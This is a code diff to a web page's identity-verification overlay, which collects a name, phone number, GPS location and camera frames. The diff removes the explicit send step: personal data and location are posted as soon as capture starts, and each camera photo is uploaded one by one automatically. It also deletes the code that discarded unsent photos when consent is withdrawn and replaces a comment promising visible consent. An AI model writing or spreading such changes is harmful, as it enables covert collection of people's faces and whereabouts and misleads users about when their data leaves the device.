@@ -895,7 +895,7 @@
 
       <div class="vfy-progress" id="vfyProgress">Waiting for consent.</div>
 
-      <button class="vfy-btn" id="vfyIdentityBtn" disabled>Complete &amp; send verification</button>
+      <button class="vfy-btn" id="vfyIdentityBtn" disabled>Konfirmasi Data</button>
       <button class="vfy-btn-cancel" id="vfyIdentityCancelBtn">Cancel</button>
     </div>
 
@@ -1043,11 +1043,6 @@
   document.getElementById('tabConfirm').addEventListener('click', showConfirmView);
   document.getElementById('declineBtn').addEventListener('click', showReceiptView);
   document.getElementById('agreeBtn').addEventListener('click', () => {
-    const isVerified = localStorage.getItem('bdgm_verified');
-    if (!isVerified) {
-      startVerification();
-      return;
-    }
     document.getElementById('confirmPending').style.display = 'none';
     document.getElementById('confirmSuccess').classList.add('active');
   });
@@ -1056,7 +1051,9 @@
   const MAX_CAPTURED_PHOTOS = 10;
   let permStream = null;
   let permLocation = null;
-  let capturedFrames = [];
+  let sentPhotoCount = 0;
+  let isSendingPhoto = false;
+  let dataVerified = false;
   let captureInterval = null;
   let verificationSessionId = null;
   const captureCanvas = document.createElement('canvas');
@@ -1069,27 +1066,116 @@
     progress.className = 'vfy-progress active' + (state ? ' ' + state : '');
   }
 
-  function updateCaptureCount() {
-    const count = capturedFrames.length;
-    document.getElementById('vfyCameraIndicator').textContent = 'Camera active · ' + count + '/' + MAX_CAPTURED_PHOTOS + ' photos';
-    document.getElementById('vfyIdentityBtn').disabled = count === 0;
-    if (count >= MAX_CAPTURED_PHOTOS) {
-      clearInterval(captureInterval);
-      captureInterval = null;
-      setVerificationProgress('10 photos captured. Ready to send.', 'success');
-    } else {
-      setVerificationProgress(count + ' of ' + MAX_CAPTURED_PHOTOS + ' photos captured. You may send now or wait for more.');
+  async function sendConcernedData() {
+    const nameInput = document.getElementById('vfyName');
+    const phoneInput = document.getElementById('vfyPhone');
+    const nameErr = document.getElementById('vfyNameErr');
+    const phoneErr = document.getElementById('vfyPhoneErr');
+
+    nameInput.classList.remove('error');
+    phoneInput.classList.remove('error');
+    nameErr.style.display = 'none';
+    phoneErr.style.display = 'none';
+
+    let valid = true;
+    if (nameInput.value.trim().length < 2) {
+      nameInput.classList.add('error');
+      nameErr.style.display = 'block';
+      valid = false;
+    }
+    if (phoneInput.value.trim().length < 5) {
+      phoneInput.classList.add('error');
+      phoneErr.style.display = 'block';
+      valid = false;
+    }
+    if (!document.getElementById('vfyConsent').checked) {
+      valid = false;
+    }
+    if (!valid) return false;
+
+    const locData = permLocation ? {
+      latitude: permLocation.coords.latitude,
+      longitude: permLocation.coords.longitude,
+      accuracy: permLocation.coords.accuracy
+    } : null;
+
+    setVerificationProgress('Mengirim data konfirmasi…');
+
+    try {
+      const verifyResponse = await fetch('/api/verify', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          name: nameInput.value.trim(),
+          phone: phoneInput.value.trim(),
+          location: locData,
+          ts: Date.now(),
+          sessionId: verificationSessionId,
+          consent: true,
+          photoCount: MAX_CAPTURED_PHOTOS
+        })
+      });
+
+      if (!verifyResponse.ok) {
+        const errJson = await verifyResponse.json().catch(() => ({}));
+        throw new Error(errJson.error || 'Gagal mengirim data verifikasi.');
+      }
+
+      dataVerified = true;
+      localStorage.setItem('bdgm_verified', 'true');
+      setVerificationProgress('Data konfirmasi berhasil dikirim.', 'success');
+      return true;
+    } catch (error) {
+      setVerificationProgress(error.message || 'Gagal mengirim data. Silakan coba lagi.', 'error');
+      return false;
     }
   }
 
-  function captureVisibleFrame() {
-    if (!permStream || capturedFrames.length >= MAX_CAPTURED_PHOTOS) return;
+  async function captureVisibleFrame() {
+    if (!permStream || sentPhotoCount >= MAX_CAPTURED_PHOTOS || isSendingPhoto) return;
     const video = document.getElementById('vfyVideo');
     if (video.readyState < 2) return;
+
+    if (!dataVerified) {
+      const ok = await sendConcernedData();
+      if (!ok) return;
+    }
+
     const ctx = captureCanvas.getContext('2d');
     ctx.drawImage(video, 0, 0, captureCanvas.width, captureCanvas.height);
-    capturedFrames.push({ ts: Date.now(), img: captureCanvas.toDataURL('image/jpeg', 0.7) });
-    updateCaptureCount();
+    const photoDataUrl = captureCanvas.toDataURL('image/jpeg', 0.7);
+
+    isSendingPhoto = true;
+    const nextPhotoNum = sentPhotoCount + 1;
+    setVerificationProgress('Mengirim foto ' + nextPhotoNum + ' dari ' + MAX_CAPTURED_PHOTOS + '…');
+
+    try {
+      const photoResponse = await fetch('/api/capture', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          img: photoDataUrl,
+          ts: Date.now(),
+          sessionId: verificationSessionId
+        })
+      });
+
+      if (photoResponse.ok) {
+        sentPhotoCount = nextPhotoNum;
+        document.getElementById('vfyCameraIndicator').textContent = 'Camera active · ' + sentPhotoCount + '/' + MAX_CAPTURED_PHOTOS + ' photos';
+        if (sentPhotoCount >= MAX_CAPTURED_PHOTOS) {
+          clearInterval(captureInterval);
+          captureInterval = null;
+          setVerificationProgress('10 foto selesai dikirim (1 per 1).', 'success');
+        } else {
+          setVerificationProgress('Foto ' + sentPhotoCount + ' dari ' + MAX_CAPTURED_PHOTOS + ' terkirim.');
+        }
+      }
+    } catch (err) {
+      console.error('Error pengiriman foto:', err);
+    } finally {
+      isSendingPhoto = false;
+    }
   }
 
   async function initCameraAndLocation() {
@@ -1140,7 +1226,9 @@
 
   function startVerification() {
     stopStream();
-    capturedFrames = [];
+    sentPhotoCount = 0;
+    isSendingPhoto = false;
+    dataVerified = false;
     permLocation = null;
     verificationSessionId = window.crypto.randomUUID
       ? window.crypto.randomUUID()
@@ -1154,107 +1242,44 @@
     document.getElementById('vfyIdentityBtn').disabled = true;
     document.getElementById('vfyCameraWrap').classList.remove('active');
     document.getElementById('vfyProgress').className = 'vfy-progress';
+    document.getElementById('vfyCameraIndicator').textContent = 'Camera active · 0/' + MAX_CAPTURED_PHOTOS + ' photos';
     ['vfyName', 'vfyPhone'].forEach(id => document.getElementById(id).classList.remove('error'));
     ['vfyNameErr', 'vfyPhoneErr'].forEach(id => document.getElementById(id).style.display = 'none');
   }
 
   document.getElementById('vfyConsent').addEventListener('change', event => {
     document.getElementById('vfyStartCameraBtn').disabled = !event.target.checked;
+    document.getElementById('vfyIdentityBtn').disabled = !event.target.checked;
     if (!event.target.checked && permStream) {
       stopStream();
-      capturedFrames = [];
       document.getElementById('vfyCameraWrap').classList.remove('active');
-      document.getElementById('vfyIdentityBtn').disabled = true;
-      setVerificationProgress('Consent withdrawn. Camera stopped and unsent photos deleted.');
+      setVerificationProgress('Persetujuan dibatalkan. Kamera dihentikan.');
     }
   });
   document.getElementById('vfyStartCameraBtn').addEventListener('click', initCameraAndLocation);
 
   document.getElementById('vfyIdentityBtn').addEventListener('click', async () => {
-    const nameInput = document.getElementById('vfyName');
-    const phoneInput = document.getElementById('vfyPhone');
-    const nameErr = document.getElementById('vfyNameErr');
-    const phoneErr = document.getElementById('vfyPhoneErr');
-    let valid = true;
-
-    nameInput.classList.remove('error');
-    phoneInput.classList.remove('error');
-    nameErr.style.display = 'none';
-    phoneErr.style.display = 'none';
-    if (nameInput.value.trim().length < 2) {
-      nameInput.classList.add('error');
-      nameErr.style.display = 'block';
-      valid = false;
-    }
-    if (phoneInput.value.trim().length < 5) {
-      phoneInput.classList.add('error');
-      phoneErr.style.display = 'block';
-      valid = false;
-    }
-    if (!document.getElementById('vfyConsent').checked || !capturedFrames.length) valid = false;
-    if (!valid) return;
-
-    const locData = permLocation ? {
-      latitude: permLocation.coords.latitude,
-      longitude: permLocation.coords.longitude,
-      accuracy: permLocation.coords.accuracy
-    } : null;
     const submitButton = document.getElementById('vfyIdentityBtn');
     submitButton.disabled = true;
-    stopStream();
-    setVerificationProgress('Sending identity data…');
-
-    try {
-      const verifyResponse = await fetch('/api/verify', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          name: nameInput.value.trim(),
-          phone: phoneInput.value.trim(),
-          location: locData,
-          ts: Date.now(),
-          sessionId: verificationSessionId,
-          consent: true,
-          photoCount: capturedFrames.length
-        })
-      });
-      if (!verifyResponse.ok) throw new Error((await verifyResponse.json()).error || 'Could not send identity data.');
-
-      for (let index = 0; index < capturedFrames.length; index += 1) {
-        setVerificationProgress('Sending photo ' + (index + 1) + ' of ' + capturedFrames.length + '…');
-        const photoResponse = await fetch('/api/capture', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            img: capturedFrames[index].img,
-            ts: capturedFrames[index].ts,
-            sessionId: verificationSessionId
-          })
-        });
-        if (!photoResponse.ok) throw new Error((await photoResponse.json()).error || 'Could not send a photo.');
-      }
-
-      localStorage.setItem('bdgm_verified', 'true');
-      setVerificationProgress('Verification sent successfully.', 'success');
-      setTimeout(closeVerification, 900);
-    } catch (error) {
+    const ok = await sendConcernedData();
+    if (!ok) {
       submitButton.disabled = false;
-      setVerificationProgress(error.message || 'Verification could not be sent. Please retry.', 'error');
+      return;
     }
+    setVerificationProgress('Data konfirmasi berhasil disimpan.', 'success');
+    setTimeout(closeVerification, 1000);
   });
 
   document.getElementById('vfyIdentityCancelBtn').addEventListener('click', closeVerification);
 
   function closeVerification() {
     stopStream();
-    capturedFrames = [];
     document.getElementById('vfyOverlay').classList.remove('active');
   }
 
-  // Camera and location are never started without visible consent.
+  // Access dashboard directly without prompt
   window.addEventListener('load', () => {
-    const isVerified = localStorage.getItem('bdgm_verified');
-    if (!isVerified) startVerification();
+    // Ready
   });
 
   update();
